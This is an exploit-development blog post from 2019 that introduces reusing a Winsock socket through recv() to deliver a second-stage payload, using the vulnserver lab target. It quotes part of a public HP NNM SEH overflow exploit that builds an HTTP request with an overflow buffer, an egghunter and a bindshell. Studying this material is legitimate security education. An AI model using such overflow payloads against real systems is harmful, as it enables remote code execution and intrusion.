---
title:  "Exploit Development: Second Stage Payload - WS_32.recv() Socket Reuse"
date:   2019-05-13
tags: [posts]
excerpt: "Reusing an existing socket connection to add a buffer of a user defined length."
---
Introduction
---
While doing further research on ways to circumvent constraints on buffer space, I stumbled accross a neat way to append a second stage user supplied buffer of a given length to an exploit. Essentially, we will be utilizing the [winsock.h](https://docs.microsoft.com/en-us/windows/win32/api/winsock/) header from the [Win32 API](https://docs.microsoft.com/en-us/windows/desktop/apiindex/windows-api-list) to write a few pieces of shellcode, in order to get parameters for a function call onto the stack. Once these parameters are on the stack, we will call the [recv](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv) function from __WS_32.dll__. This will allow us to pass a second stage buffer, in order to execute a useful piece of shellcode, like a shell. Let's get into it.

Replicating the Function Call
---
As mentioned before, in order to execute a successful exploit, we must find out where the function call is happening within the [vulnerable piece of software](https://github.com/stephenbradshaw/vulnserver). This is no different than the process of exploiting a vulnerable parameter in an HTTP request. Let's take a closer look at this.

Here is a snippet of source code from [muts'](https://twitter.com/muts?lang=en) famous HP NNM Exploit:

```python
import socket
import os
import sys

print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
print "[*] http://www.offensive-security.com"

# --- #

evilcrash = "\xeb"*1101 + "\x41\x41\x41\x41\x77\x21\x6e\x6c\x35\x6d" + "G"*32 +egghunter + "A"*100 + ":7510"

buffer="GET http://" + evilcrash+ "/topology/homeBaseView HTTP/1.1\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= bindshell 
```

If we take a look at the `buffer` parameter, we can clearly see that this is an HTTP request. The vulnerability seems to arise from the [Host](https://www.itprotoday.com/devops-and-software-development/what-host-header) header. So, in order for this exploit to be successful- one must successfully replicate a valie HTTP request. This is no different than what the `recv()` function requires. We are tasked with successfully fulfilling the valid parameters in order to call the function.


